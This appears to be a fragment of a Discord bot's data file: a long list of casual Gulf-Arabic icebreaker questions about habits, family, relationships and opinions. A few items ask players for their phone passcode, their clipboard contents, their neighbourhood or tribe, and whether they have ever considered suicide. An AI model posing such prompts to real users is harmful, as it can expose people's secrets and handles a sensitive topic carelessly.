            "اطول مدة جلسة تذاكر فيها بشكل متواصل كم ساعة ؟",
            "قبل امس الوقت هذا إيش كنت تسوي ؟",
            "منشن شخص لو م شفته تحس يومك ناقص ؟",
            "كلمتك اذا شفت حاجة حلوة ؟",
            "خوالك ولا عمامك ؟",
            "عادي تطلع وجوالك مافيه شحن كثير ؟",
            "شيء من صغرك ماتغير فيك ؟",
            "أصعب انتظار ؟",
            "أجمل بيت شعر سمعته ...",
            "مودك الحين ؟",
            "عندك صديق يحمل نفس اسمك ؟",
            "محادثة ولا مكالمة ؟",
            "كم مره يتقلب مزاجك باليوم ؟",
            "اكثر شخص يسوي فيك مقالب ؟",
            "مكان تبي تكون فيه الحين ؟.",
            "كم من عشرة تحب مهنة التدريس ؟",
            "شنو تتوقع بتصير بعد 10 سنين ؟ ",
            "متى تحب الطلعة ؟",
            "أغرب شي اشتهيت تأكله فجأة ؟",
            "اخر مره بكيت متى ؟",
            "اكثر شخص يقفل بوجهك اذا كلمك ؟",
            "كثر شخص يكرفك ؟",
            "تدخل بنقاش بموضوع ماتفهم فيه شيء ولا تسكت وتسمع بس ؟",
            "عمرك طحت بمكان عام ؟",
            "شخص يعرف عنك كل شي تقريباً ؟",
            "اكثر واحد يرسلك بالديسكورد ؟",
            "إيش اللي قدامك الحين ؟",
            "من النوع اللي تعتمد على غيرك ولا كل شي تسويه بنفسك ؟",
            "تقدر تعيش يوم كامل بدون نت ؟",
            "مع او ضد : الاعتراف بـ شيء في قلبك دام طويلاً ؟",
            "أبوك إيش يقرب لأمك ؟",
            "اكثر مدة جلستها بدون نت ؟",
            "لو رجعناك خمس سنين هل كنت تتوقع ان حياتك بتكون نفس وضعك الحين ؟",
            "تتقبل النصيحة من أي أحد ؟",
            "متى لازم تقول لا ؟",
            "أكثر ماده تحبها دراسياً والسبب؟.",
            "إيش نوع قهوتك المفضلة ؟",
            "شخص تشوفه بشكل يومي غير اهلك ؟",
            "شخص تحب ابتسامتة ؟",
            "من الاشياء اللي تجيب لك الصداع ؟",
            "وش تحب تسوي وقت فضاوتك ؟.",
            "كم تعطي نفسك من عشرة بالجدية بحياتك ",
            "أكثر شي يعتمدون عليك فيه ؟",
            "اكثر صفة عندك ؟",
            "كيف تعبر عن عصبيتك ؟",
            "كم داخل سيرفر فالديسكورد ؟",
            "حصلت الشخص اللي يفهمك ولا باقي ؟",
            "تفضل .. العيون الناعسة ... العيون الواسعة ؟",
            "اشياء تغيرت تظرتك لها",
            "الرقم السري حق جوالك ...",
            "لو قررت تقفل جوالك يوم كامل مين تتوقع أنه يفتقدك ؟",
            "اخر هوشه جلدت ولا انجلدت ؟",
            "نصيحه صغيرة من واقع تجربتّك؟.",
            "شخص يكلمك بشكل يومي ؟",
            "أسم وانطباعك عنه ؟",
            "العصر إيش كنت تسوي ؟",
            "كم من عشرة تعطي اهتمامك بدراستك أو عملك ؟",
            "كيف تفرغ غضبك بالعادة ؟",
            "أطول مدة قضيتها بعيد عن أهلك ؟",
            "شخص مستحيل تمسك ضحكتك معاه؟",
            "حاجة دايم تضيع منك ؟",
            "تجامل احد على حساب مصلحتك ؟",
            "كم لك فـ الديسكورد ؟",
            "اخر شخص تهاوشت معه مين ؟",
            "اكثر شيء تكره تنتظره ؟",
            "اخر مطعم اكلت منه ؟",
            "اكثر شيء تحبه بـ شكلك ؟",
            "تنام بـ اي مكان ، ولا بس غرفتك ؟",
            "اكتب اول كلمة جات في بالك الحين ؟",
            "تهمك التفاصيل ولا الزبدة من الموضوع ؟",
            "شيء واحد .. م عاد يهمك كثر اول ؟",
            "كم تقييمك لـ طبخك من 10 ، ولا م تطبخ ؟",
            "اتفه شيء ارسلوك عشانه ؟",
            "فن تحبه كثير ؟",
            "اكثر سوالفك عن ...؟",
            "صفة موجودة في جميع افراد عائلتك ؟",
            "شخص م تقدر تكذب عليه ؟",
            "كم من 10 تحس بـ الطفش ؟",
            "من النوع الي تجيك الردود القوية بعد الهوشة ولا فـ وقتها ؟",
            "تحب تجرب الاشياء الجديدة ، ولا تنتظر الناس يجربونها اول ؟",
            "وش اغبى شيء سويته ؟",
            "اكثر كلمة الناس تقولها عن شخصيتك ؟",
            "مراقبة شخص تركته .. فضول ولا بقايا مشاعر ؟",
            "برنامج كرهته الفترة هاذي",
            "مشهور ، او مشهورة .. يشبهونك فيه",
            "بالغالب وش تسوي فـ الويكند ؟",
            "وش اسم الحي الي ساكن فيه ؟",
            "اكثر شيء تخاف منه ؟",
            "عاده لاتستطيع تركها ؟ ",
            "كم من الوقت تحتاج عشان تصحصح من بعد م صحيت من النوم ؟",
            "اذا حسيت بـ غيرة تتكلم ولا تسكت ؟",
            "مع او ضد ... اقاربك يعرفون عن حساباتك في برامج التواصل ؟",
            "اخر مره سافرت بالطائرة والى وين؟",
            "وش اليوم الي تكرف فيه كثير ؟",
            "تفضل .. الاعمال الحرة ولا الوظيفة ؟",
            "حاجة تشوف نفسك مبدع فيها ؟",
            "ماركتك المفضلة ؟",
            "منشن ... اكثر شخص تثق فيه ؟",
            "اذا انسجنت وش تتوقع بتكون التهمة الي عليك ؟",
            "تعطي الناس فرصة تتقرب منك ؟",
            "منشن .. الشخص الي يستحق تدخل الديسكورد عشانه ..",
            "متى اخر مره نمت اكثر من 12 ساعة ؟",
            "رائحة عطر مدمن عليها ..",
            "وش تحس انك تحتاج الفترة هاذي ؟",
            "كم من 10 البرود فيك ؟",
            "وش اكثر فاكهة تحبها ؟",
            "اصعب وظيفة في نظرك ؟",
            "شيء بسيط قادر على حل كل مشاكلك ..",
            "اذا جلست عند ناس م تعرفهم .. تكتفي بالسكوت ، ولا تتكلم معهم ؟",
            "تتحمل المزح الثقيل ؟",
            "من النوع الي تنام فـ طريق السفر ؟",
            "لو شلنا من طولك 100 كم يبقى من طولك ؟",
            "موقفك من شخص أخفى عنك حقيقة ما، تخوفًا من خسارتك؟ ",
            "اكثر شخص ينرفزك الي ؟",
            "تعرف تتصرف في المواقف العصبة ؟",
            "متى حسيت انك مختلف عن الي غيرك ؟",
            "اصعب مرحلة دراسية مرت عليك ؟",
            "سويت شيء بالحياة وانت مو مقتنع فيه ؟",
            "اخر مره ضربوك فيها ... ووش كان السبب ؟",
            "من الاشياء الي تجيب لك الصداع ؟",
            "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟",
            "مع او ضد : النوم افضل حل لـ مشاكل الحياة ...",
            "تجامل ولا صريح ؟",
            "تفضل المواد الي تعتمد على الحفظ ولا الفهم ؟",
            "صفة تخليك تكره الشخص مهما كان قربه منك ؟",
            "جربت احد يعطيك بلوك وانت تكتب له ؟",
            "تهتم بـ معرفة تاريخ ميلاد الي تحبهم ؟",
            "فيه شيء م تحب تطلبه حتى لو كنت محتاجة ؟",
            "دائما قوة الصداقة بـ ... ؟",
            "اخر شخص قالك كلمة حلوة ..",
            "كم من 10 الي تتوقعه يصير ؟",
            "اذا كنت بنقاش مع شخص وطلع الحق معه تعترف له ولا تصر على كلامك ؟",
            "فيه شخص تكرهه بشكل كبير ؟ ولك جرأة تمنشن اسمه ؟",
            "كيف الجو عندكم اليوم ؟",
            "ترتيبك بالعائلة ؟",
            "تسمع شيلات ؟",
            "تفضل السفر فـ الشتاء ولا الصيف ؟",
            "مع او ضد : الهدية بـ معناها وليس بـ قيمتها",
            "عندك صحبة من اشخاص خارج دولتك",
            "عندك صحبة من اشخاص خارج دولتك ؟",
            "تحب اصوات النساء فـ الاغاني ولا الرجال",
            "وش اول جوال شريته ؟",
            "وش النوع الي تحبه ف الافلام ؟",
            "اكثر مكان تحب تجلس فيه فالبيت ؟",
            "صفة قليل تحصلها فـ الناس حالياً ؟",
            "من النوع الي تعترف ولا تجحد ؟",
            "اول شخص تكلمه اذا صحيت من النوم ؟",
            "وش اجمل لهجة عرببية بالنسبة لك ؟",
            "اخر اتصال من مين كان ؟",
            "اجمل مدينة بدولتك ؟",
            "شاعرك المفضل ؟",
            "كم مره تشحن جوالك باليوم",
            "لو كنت مؤلف كتاب .. وش راح يكون اسمه ؟",
            "اطول مدة قضيتها بدون اكل ..",
            "كم من 10 نسبة الكسل فيك هالايام ؟",
            "نومك خفيف ولا ثقيل ؟",
            "كم من عشرة تشوف صوتك حلو ؟",
            "تجيك الضحكة بوقت غلط ؟",
            "تفضل التسوق من الانترنت ، ولا الواقع ؟",
            "اغرب اسم مر عليك ؟",
            "وش رقمك المفضل ؟",
            "شيء تبيه يصير الحين ...",
            "شاي ولا قهوة ؟",
            "صفة يشوفونها الناس سيئة ، وانت تشوفها كويسه",
            "لون تكرهه ...",
            "وظيفة تحسها لايقة عليك ...",
            "كم من 10 كتابتك بالقلم حلوة ؟",
            "اكلة ادمنتها الفترة ذي ...",
            "اجمل مرحلة دراسية مرت عليك ..",
            "اكثر شيء تكرهه فالديسكورد ..",
            "شيء مستحيل انك تاكله ...",
            "وش رايك بالي يقرأ ولا يرد ؟",
            "اسمك بدون اول حرفين ..",
            "متى تكره الطلعة ؟",
            "شخص من عائلتك يشبهونك فيه ...",
            "اكثر وقت تحب تنام فيه ...",
            "تنتظر احد يجيك ؟",
            "اسمك غريب ولا موجود منه كثير ؟",
            "وش الشيء الي يكرهه اقرب صاحب لك ؟",
            "كم من 10 حبك للكتب ؟",
            "جربت الشهرة او تتمناها ؟",
            "مين اقرب شخص لك بالعائلة ؟",
            "شيء جميل صار لك اليوم ؟",
            "كلمتك اذا احد حشرك بالنقاش ...",
            "اعمال يدوية نفسك تتقنها . ",
            "وش الي يغلب عليك دائما .. قلبك ولا عقلك ؟",
            "صفة تحمد الله انها مو موجودة في اصحابك ...",
            "كم وجبة تاكل فاليوم الفترة هاذي ؟",
            "جربت دموع الفرح ؟ وش كان السبب ؟",
            "لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟",
            "‏لو حطوك بمستشفى المجانين كيف تقنعهم إنك مو مجنون ؟.",
            "اكثر شيء تحبه فالشتاء ...",
            "شيء ودك تتركه ...",
            "كم تعطي نفسك من 10 فاللغة الانجليزية ؟",
            "شخص فرحتك مرتبطة فيه ...",
            "اكتب اسم .. واكتب كيف تحس بيكون شكله ...",
            "متى اخر مره قلت ليتني سكت ؟",
            "ممكن تكره احد بدون سبب ؟",
            "اكثر وقت باليوم تحبه ...",
            "اكثر شيء حظك سيء فيه ...",
            "متى صحيت ؟",
            "كلمة صعب تقولها وثقيلة عليك ...",
            "ردك الدائم على الكلام الحلو ...",
            "سؤال دايم تتهرب من الاجابة عليه ...",
            "مين الشخص اللي مستعد تأخذ حزنه بس م تشوفه حزين ؟.",
            "جربت تروح اختبار بدون م تذاكر ؟",
            "كم مرة غشيت ف الاختبارات ؟",
            "وش اسم اول شخص تعرفت عليه فالديسكورد ؟",
            "تعطي فرصة ثانية للشخص الي كسرك ؟",
            "لو احتاج الشخص الي كسرك مساعدة بتوقف معه ؟",
            "@منشن... شخص ودك تطرده من السيرفر ...",
            "دعاء له اثر إبجابي في حياتك ...",
            "قل حقيقه عنك ؟",
            "انسان م تحب تتعامل معه ابد",
            "اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟",
            "الانتقاد الكثير يغيرك للافضل ولا يحطمك ويخليك للأسوأ ؟",
            "كيف تعرف اذا هذا الشخص يكذب ولا لا ؟",
            "مع او ضد : العتاب على قدر المحبة ...",
            "شيء عندك اهم من الناس",
            "تتفاعل مع الاشياء اللي تصير بالمجتمع ولا ماتهتم ؟.",
            "وش الشيء الحلو الي يميزك عن غيرك ؟",
            "كذبة كنت تصدقها وانت صغير ..",
            "@منشن .. شخص تخاف منه اذا عصب ...",
            "كلمة بـ لهجتك تحس م احد بيعرفها ...",
            "كمل ... انا من الاشخاص الي ...",
            "تراقب احد بالديسكورد ؟",
            "كيف تعرف ان هالشخص يحبك ؟",
            "هواية او تجربة كان ودك تستمر و تركتها ؟",
            "الديسكورد اشغلك عن حياتك الواقعية ؟",
            "اكمل ... تستمر علاقتك بالشخص اذا كان ...",
            "لو احد قالك اكرهك وش بتقول له ؟",
            "مع او ضد : عامل الناس كما يعاملوك ؟",
            "ارسل اخر صورة فـ الالبوم ...",
            "الصق وارسل اخر شيء نسخته ...",
            "ماهي اخر وجبة اكلتها ",
            "اكثر شيء تحس انه مات ف مجتمعنا",
            "برأيك ماهو افضل انتقام ...",
            "اكثر ريحة تجيب راسك ...",
            "شعور ودك يموت ...",
            "عمرك فضفضت لـ شخص وندمت ؟",
            "تقدر تتحمل عيوب شخص تحبه ؟",
            "يكبر الشخص ف عيونك لما ...",
            "وش تقول للشخص الي معك دائماً ف وقت ضيقتك ؟",
            "مقولة او حكمة تمشي عليها ...",
            "منشن ... شخص اذا وضعه على الجرح يلتهب زيادة",
            "منشن ... شخص يعجبك كلامه و اسلوبه ...",
            "لو السرقة حلال ... وش اول شيء بتسرقه ؟",
            "مع او ضد : المرأة تحتاج لرجل يقودها ويرشدها ...",
            "مع او ضد : لو دخل الشك ف اي علاقة ستنتهي ...",
            "منشن... اي شخص واوصفه بـ كلام بسيط ...",
            "مع او ضد : قلة العلاقات راحة ...",
            "لو خيروك : تعض لسانك بالغلط ، ولا يسكر على صبعك الباب؟",
            "كلمة غريبه و معناها ...",
            "نصيحة تقدمها للشخص الثرثار ...",
            "مع او ضد :  مساعدة الزوجة في اعمال المنزل مهما كانت ...",
            "منشن... شخص يجيك فضول تشوف وجهه ...",
            "كلمة لـ شخص عزيز عليك ...",
            "اكثر كذبة تقولها ...",
            "معروف عند اهلك انك ...",
            "وش اول طريقة تتبعها اذا جيت تراضي شخص",
            "ع او ضد : ما تعرف قيمة الشخص اذا فقدته ...",
            "تحب تختار ملابسك بنفسك ولا تحب احد يختار معك ...",
            "وش اكثر شيء انجلدت بسببه وانت صغير ؟",
            "فـ اي برنامج كنت قبل تجي الديسكورد ؟",
            "تنسد نفسك عن الاكل لو زعلت ؟",
            "وش الشيء الي تطلع حرتك فيه و زعلت ؟",
            "مع او ضد : الصحبة تغني عن الحب ... ",
            "منشن... اخر شخص خلاك تبتسم",
            "لو نطق قلبك ماذا سيقول ...",
            "ماذا يوجد على يسارك حالياً ؟",
            "مع او ضد : الشخص الي يثق بسرعة غبي ...",
            "شخصية كرتونية تأثرت فيها وانت صغير ...",
            "مع او ضد : الاهتمام الزائد يضايق",
            "لو خيروك : تتزوج ولا تكمل دراستك ...",
            "منشن... لو بتختار شخص تفضفض له مين بيكون ؟",
            "كمل : مهما كبرت بخاف من ....",
            "اخر عيدية جاتك وش كانت ...",
            "وش حذفت من قاموس حياتك ...",
            "شيء تتمنى م ينتهي ...",
            "اكره شعور ممكن يحس فيه الانسان هو ...",
            "مع او ضد : يسقط جمال المراة بسبب قبح لسانها ...",
            "ماهي الخسارة في نظرك ...",
            "لو المطعم يقدم الوجبه على حسب شكلك وش راح تكون وجبتك ؟",
            "مع او ضد : يموت الحب لو طال الغياب",
            "وش الشيء الي يحبه اغلب الناس وانت م تحبه ..",
            "تحدث عن نفسك ؟",
            "اقوى جملة عتاب وصلتك",
            "على ماذا ندمت ؟",
            "اخر مرة انضربت فيها من احد اهلك ، ولماذا ؟",
            "افضل طريقة تراضي فيها شخص قريب منك",
            "لو بإمكانك تقابل شخص من الديسكورد مين بيكون ؟",
            "كمل : كذاب من يقول ان ...",
            "طبعك صريح ولا تجامل ؟",
            "مين اقرب لك ؟ اهل امك ، اهل ابوك  ...",
            "وش لون عيونك ؟",
            "مع او ضد : الرجال اكثر حقداً من النساء",
            "مع او ضد : ينحب الشخص من اهتمامه",
            "@منشن: شخص تقوله اشتقت لك",
            "بصراحة : تحب تفضفض وقت زعلك ، ولا تنعزل ؟",
            "مع او ضد : حبيبك يطلب منك حذف اصحابك بحكم الغيرة",
            "متى تحس بـ شعور حلو ؟",
            "لو حياتك عبارة عن كتاب .. وش بيكون اسمه ؟",
            "@منشن: شخص واسأله سؤال ...",
            "كم مره سويت نفسك غبي وانت فاهم ،  ومع مين ؟",
            "اكتب شطر من اغنية او قصيدة جا فـ بالك",
            "كم عدد الاطفال عندكم فالبيت ؟",
            "@منشن : شخص وعطه وظيفة تحس تناسبه",
            "اخر مكالمة فـ الخاص كانت مع مين ؟",
            "عمرك ضحيت باشياء لاجل شخص م يسوى ؟",
            "كمل : حلو يومك بـ وجود ...",
            "مع او ضد : المرأة القوية هي اكثر انسانه انكسرت",
            "نصيحة تقدمها للغارقين فالحب ...",
            "مبدأ تعتمد عليه فـ حياتك",
            "ترد بالمثل على الشخص لو قذفك ؟",
            "شيء مهما حطيت فيه فلوس بتكون مبسوط",
            "@منشن: اكثر شخص يفهمك",
            "تاريخ ميلادك + هدية بخاطرك تجيك",
            "كم كان عمرك لما اخذت اول جوال ؟",
            "عمرك كتبت كلام كثير بعدين مسحته ، مع مين كان؟",
            "برأيك : وش اكثر شيء يرضي البنت الزعلانه ؟",
            "مساحة فارغة (..............) اكتب اي شيء تبين",
            "تترك احد عشان ماضيه سيء ؟",
            "تهتم بالابراج ، واذا تهتم وش برجك ؟",
            "لو ستبدأ حياتك من جديد ، وش راح تغير بـ نفسك ؟",
            "تتوقع فيه احد حاقد عليك ويكرهك ؟",
            "وش يقولون لك لما تغني ؟",
            "مين المغني المفضل عندك ؟",
            "ميزة ودك يضيفها البرنامج",
            "وش الي مستحيل يكون لك اهتمام فيه ؟",
            "البنت : تتزوجين احد اصغر منك ",
            "الرجل : تتزوج وحده اكبر منك",
            "احقر الناس هو من ...",
            "البنت : وش تتمنين تكون وظيفة زوجك ",
            "الرجل : وش تتمنى وظيفة زوجتك",
            "برأيك : هل الانتقام من الشخص الذي اخطأ بحقك راحة ؟",
            "اهم شيء يكون معك فـ كل طلعاتك ؟",
            "وش الخدمة الالكترونية الي تتمنى تصير ؟",
            "كلمة تخليك تلبي الطلب حق الشخص بدون تفكير",
            "وش الفايدة الي اخذتها من الديسكورد ؟",
            "مع ام ضد : غيرة البنات حب تملك وانانية",
            "هل سبق ان ندمت انك رفضت شيء ، وش كان ؟",
            "تشوف انك قادر على تحمل المسؤولية ؟",
            "مع او ضد : الناس يفضلون الصداقة وعندما يأتي الحب يتركون الصداقة",
            "اعلى نسبة جبتها ف حياتك الدراسية",
            "تحب احد يتدخل ف امورك الشخصية  ؟",
            "لو واحد يتدخل ف امورك وانت م طلبت منه وش بتقوله ؟",
            "تاخذ بنصيحة  الاهل ام من الاصحاب ؟",
            "فيه شيء م تقدر تسيطر عليه ؟",
            "@منشن : شخص تحب سوالفه",
            "وش الكذبة المعتادة الي تسويها لو بتقفل من احد ؟",
            "@منشن: الشخص الي عادي تقوله اسرارك",
            "لو زعلت بقوة وش بيرضيك ؟",
            "كلمة تقولها لـ بعض الاشخاص في حياتك",
            "ندمت انك اعترف بمشاعرك لـ شخص",
            "وش الاكلة المفضلة عندك ؟",
            "وش تتخيل يصير معك فـ المستقبل ؟",
            "اسم الطف شخص مر عليك الكترونياً",
            "مع او ضد : الاستقرار النفسي اهم استقرار",
            "مع او ضد : كل شيء راح يتعوض",
            "برأيك : وش الشيء الي مستحيل يتعوض ؟",
            "تفضل : الدجاج ، اللحم ، السمك",
            "تفضل : الصباح ، الليل",
            "كمل : النفس تميل لـ ...",
            "عندك القوة انك تبين اعجابك لـ شخص ؟",
            "مع او ضد : الرد المتأخر يهدم العلاقات",
            "مشروبك المفضل ...",
            "اقوى كذبة كذبتها على اهلك",
            "@منشن : شخص واكتب شعور نفسك يجربه",
            "وش ردة فعلك من الشخص الي يرد عليك بعد ايام او ساعات ...",
            "كيف تعبر عن عصبيتك ؟",
            "عمرك بكيت على شخص مات في مسلسل ؟",
            "تتأثر بالمسلسلات او الافلام وتتضايق معهم ؟",
            "لو خيروك : بين شخص تحبه وشخص يحبك",
            "اقسى نهاية عندك ...",
            "مع او ضد : كل م زاد المال في الزواج زادت السعادة",
            "لو سمح لك بسرقة شيء ويكون ملك لك .. ماذا ستسرق ؟",
            "تقدر تنام وخاطرك مكسور ؟",
            "برأيك : اقرب لهجة عربية قريبة للفصحى ؟",
            "مر عليك شخص ف حياتك مستحيل انك تسامحه ",
            "عندك صاحب له معك اكثر من 5 سنين ؟",
            "وش معنى اسمك ؟",
            "عندك الصاحب الي تقول للناس اتحداكم تفرقونا ؟",
            "تقييمك لـ صوتك ف الغناء من 10",
            "كم طولك ؟",
            "كم وزنك ؟",
            "وش طموحك بالحياة ؟",
            "لو بيدك توقف شيء يصير ، وش راح توقف ؟",
            "وش اسم قبيلتك ؟",
            "اقرب فعل لقلبك ؟",
            "وش نوع جوالك ؟",
            "وش المطعم المفضل عندك ؟",
            "مين الشخص الي محلي حياتك ؟",
            "انا مدمن على ...",
            "مع او ضد : الصدق هو سر استمرار العلاقات فترة طويلة",
            "تكون اجمل شخص اذا ...",
            "شكلك يعطي لأي جنسية ؟",
            "وش اكثر دولة تحب الشعب حقها ؟",
            "اول بيت تزوره فالعيد ..",
            "جمال المراة يكمن في ...",
            "مشهور تعجبك سناباته ..",
            "مشهور تكرهه",
            "يكفيك عطر واحد ولا تحب تحط اكثر من عطر ؟",
            "مرة جاك احد بيذكرك فيه وانت ناسي ؟",
            "لو احد بيذكرك فيه وانت ناسي بتسلك له ؟",
            "اغنيتك المفضلة ...",
            "مع او ضد : لو م اخذت شيء معك وقت زيارة احد انت مقصر",
            "يهمك ملابسك تكون ماركة ؟",
            "مع او ضد : او اهتزت مكانة الشخص مستيحل ترجع",
            "لو رجع لك شخص تعرفه بعد علاقته بالخيانة ، راح ترجع نفس اول ؟",
            "صفة لا تتمنى ان تكون فـ عيالك",
            "وش اسم قروبك انت واصحابك المقربين ؟",
            "وش اسم قروب عائلتك فالواتس اب ؟",
            "مع او ضد : تكون الزوجة عندما تشترط خادمة في العقد سيئة",
            "لعبة ندمت انك لعبتها ...",
            "مع او ضد : يمكن للبنت تغيير رأي الرجل بسهولة",
            "كلمة او عبارة مستحيل تنساها",
            "ارسل اكثر ايموجي تحبه",
            "شيء تتمنى يتحقق",
            "مع او ضد : الدنيا لم تتغير ، بل النفوس التي تغيرت",
            "وش جمع اسمك ؟",
            "كلمة لـ شخص زعلان منك ...",
            "عادة غريبة تسويها ..",
            "تحب ريحة الحناء ؟",
            "نومك : ثقيل ولا خفيف",
            "اكثر شيء يرفع ضغطك",
            "اكتب تاريخ مستحيل تنساه",
            "لو حظك يباع ، بكم بيكون ؟",
            "@منشن : شخص تشوف انه يجذبك",
            "البنت : عادي تحضنين اخوك ؟",
            "الولد : عادي تحضن ابوك ؟",
            "كلمة تحب تسمعها حتى لو كنت زعلان",
            "قوة الاستيعاب عندك من 10",
            "افضل نوع عطر استخدمته",
            "وش بتختار اسم لأول مولود لك ؟",
            "متى تصير نفسية ؟",
            "كيف ينطق الطفل اسمك ؟",
            "تشوف نفسك شخص عاطفي ولا علاقني ؟",
            "متى لازم تقول لا ؟",
            "تحب توجه الكلام عن طريق ( الكتابة ، الصوت )",
            "مين اقرب لك : (خوالك ، عمامك )",
            "تحب تتعرف على ناس جديدة ولا اكتفيت بالي عندك ؟",
            "شيء كل م تذكرته تبتسم ...",
            "كم قروب واتس داخل ؟",
            "كم سيرفر داخل فالديسكورد ؟",
            "مع او ضد : المسامحة بعد الخيانة ...",
            "وش الامنية الي ودك تتحقق ؟",
            "كيف تتصرف مع الشخص الفضولي ؟",
            "الرجل : متى تفقد البنت انوثتها",
            "ماهي اسباب نهاية العلاقات ؟",
            "@منشن : شخص ودك تعطيه كتم ",
            "مين الي تحب يكون مبتسم دائما",
            "حصلت الشخص الي يفهمك ولا باقي ؟",
            "كم تحتاج وقت عشان تصحصح من نومك ؟",
            "كيف تعالج الغيرة الزائدة ؟",
            "مع او ضد : كل شيء حلو يكون فالبداية فقط",
            "اطول مدة قضيتها بعيد عن اهلك",
            "شيء دايم يضيع منك",
            "اغنية ناشبه ف مخك",
            "رسالة للناس الي بيدخلون حياتك",
            "جملة او كلمة تكررها",
            "اكثر اغنية تكرهها ؟",
            "صوت مغني م تحبه",
            "مع او ضد : الغيرة بين الاصدقاء",
            "اكثر وقت تحب تنام فيه",
            "وش اثقل مشوار ممكن تسويه ؟",
            "اقرب شخص لك بالعائلة",
            "اخر مكان سافرت له",
            "مع او ضد : حنا اكثر الناس عندنا حكم لكن م نطبقها",
            "مع و ضد : العتاب اكثر من مره دليل على ان الشخص م يقدرك",
            "كم مشاهداتك باسناب؟ ",
            "مع او ضد : اكثر من في الديسكورد أُناس يتصنعون",
            "شيء نفسك تعيشه من جديد",
            "كلمة تحسسك بالامان",
            "كم تعطي نفسك من 10 فـ تعاملك مع مشاكلك",
            "مع او ضد : اكثر من يحلون مشاكل الناس ، هم اكثر الناس لديهم مشاكل",
            "مع او ضد : علاج الخطأ بالخطأ في زمننا هذا هو الحل",
            "وش اكثر شيء يضيع منك ؟",
            "مع او ضد : السفر يصلح ما افسده الدهر",
            "جربت شعور حب من طرف واحد ؟",
            "ما ترد الطلعة لو كانت الى ...",
            "كم لك في الديسكورد ؟",
            "شيء كل ما تتذكره تنبسط",
            "اكتب كلام ودك الناس يطبقونه ( ......... )",
            "كيف تعالج الغيرة الزائدة ؟",
            "مع او ضد : من حق الشخص ما يبدا بالرسالة لانه مو متعود",
            "عندك شخص يكلمك يومياً ، تستحي تقوله لا ترسل",
            "مع او ضد : من يهتم بك لا تخسره قد لا تعيد لك الحياة شخصاً مثله",
            "اصعب مرحلة دراسية مرت عليك",
            "هل انت مدمن تفكير ؟",
            "تشوف الي يفكر كثير نفسية ؟",
            "من النوع الي تخطط لامورك ولا تحب تغامر",
            "اكثر وقت تحب النوم فيه",
            "شيء ودك الناس تتركه",
            "اسم اول صديق لك",
            "مع او ضد : اهتمام الشخص بك يجعلك تحب وجوده",
            "@منشن : شخص واكتب صفة م تحبها فيه",
            "اخر مكان سافرت له وين ؟",
            "@منشن : شخص تحس انه نكبه",
            "وش اكثر سؤال يدور في بالك ؟",
            "شيء م تحب احد يشاركك فيه",
            "مع او ضد : الحب بدايته اهتمام",
            "مع او ضد : دائما يكون اهتمامنا مع الانسان الخطأ",
            "لو خيروك : ( قهوة عربية - قهوة تركية )",
            "تحب الشخص ( العفوي - الثقيل - الفلة )",
            "مع او ضد : المراة الجميلة لا تتدحث عن جمالها",
            "اذا جاك كلام ولا عرفت ترد عليه وش بتسوي ؟",
            "@منشن : شخص تشوفه نفسية",
            "تحب المكالمات الطويلة ؟",
            "@منشن : شخص تحس الوقت يطير معه",
            "تنتظر اتصال من مين ؟",
            "زمن تتمنى لو انك انولدت فيه",
            "تعاني من التفكير قبل النوم ؟",
            "مع او ضد : اكثر وقت يفكر فيه الشخص وقت النوم",
            "@منشن : شخص ودك تسافر معه",
            "مرتبطة سعادتك مع سعادة مين ؟",
            "تعتمد على غيرك كثير ؟",
            "كم نسبة الغيرة عندك من 10",
            "مع او ضد : الحقير من وجد البديل ونكر الجميل",
            "مرة سويت جميل و نكره شخص ؟",
            "وش اخر شيء اكلته امس ؟",
            "مع او ضد : ثق بـ نفسك فلا احد يستحق ان تثق به",
            "انت بنفسك تصنع للاشياء قيمة ؟",
            "اخر كلمة تقولها لو خلصت كلامك ؟",
            "كيف ينطق الطفل اسمك ؟",
            "تعتبر نفسك شخص عاطفي ولا عقلاني ؟",
            "مع او ضد : الانتقام افضل وسيلة للراحة",
            "اسف تقولها لمين ؟",
            "هات صفة بأول حرف من اسمك ",
            "شخص ودك م تعرفت عليه ؟",
            "اخر رسالة ديسكورد مع مين؟ ",
            "شخص ما يرد لك طلب ؟",
            "شخص مهما طلب مستحيل ترده ...",
            "وش ناقصك الحين ؟",
            "برايك السهر ممتع ، ولا مُتعب ؟ ",
            "اصدقاء الالكترون ، ولا الواقع ؟ ",
            "حط @منشن .... لـ شخص مُتنمر من الدرجة الاولى",
            "لو كنت شخصية كرتونية اي شخصية بتكون؟",
            "ردك لو احد غلط بحقك واعتذر لك ؟ ",
            "ردك على من يدور الزعل ؟",
            "نشوف نفسك تعرف تقنع الاشخاص ولا لا",
            "اكتب ثلاث اشياء تحبها ...",
            "شخص تحس السيرفر بدونه م يسوى ",
            "اخر شخص عصبت عليه ",
            "ما معنى اسمك ؟",
            "كملها ... انا عُمري ما ( .......)",
            "جربت تحب احد من طرف واحد؟",
            "لو ضاقت فيك الدنيا ... لـ مين تروح ؟",
            "لو كنت ممثل وش تتوقع الدور الي بتتقنه؟ ",
            "خُلق يجذبك فالاخرين ",
            "مهارة تتمنى تتقنها ",
            "وش رايك بالشخص الي يعطي شعور لـ شخصين؟",
            "برأيك الفضفضه .. . نهايتها (راحة ، ندم)",
            "لو التمني يصير حقيقة ... وش بتكون امنيتك ",
            "هل بـ مرة فكرت تنتحر ؟ ",
            "اكبر كذبة كذبتها على مين ؟ ووش كانت..؟",
            "شخصية تقهرك ",
            "وجه كلمه لشخصك ؟",
            "ذكرى جميلة ودك تتكرر ",
            "اول شيء تسويه لما تطفش ",
            "برأيك / ماهو اخطر عدو للانسان ",
            "وش ابشع شعور مريت فيه ",
            "لما تطلع من الديسكورد ، راح تندم على هالايام؟",
            "مع او ضد : الناس صارت م تعرف تسولف",
            "مع او ضد / مساواة المراة بالرجل  في كل شيء؟",
            "كمل : لو اهلي يقرأون افكاري كان (.........)",
            "وش مسمي اقرب شخص لك بالجوال ؟",
            "هل تكون العلاقة فاشلة لو لم تتم بالزواج؟",
            "شيء تفكر تشتريه ...",
            "منشن شخص وقوله كلمة بس  ..",
            "لو كانت عندك فرصة جريمة واحدة ومهما كانت لن تعاقب عليها فماذا ستفعل؟",
            "كم هو عمرك في حال قمت بإضافة 25 سنة إليه؟",
            "كم مرة تنظر إلى المرآة في اليوم؟",
            "هل تثق بالأشخاص الذي تتعرف إليهم عبر التيليقرام؟",
            "هل تؤمن بالصداقة بين الشباب والبنات؟",
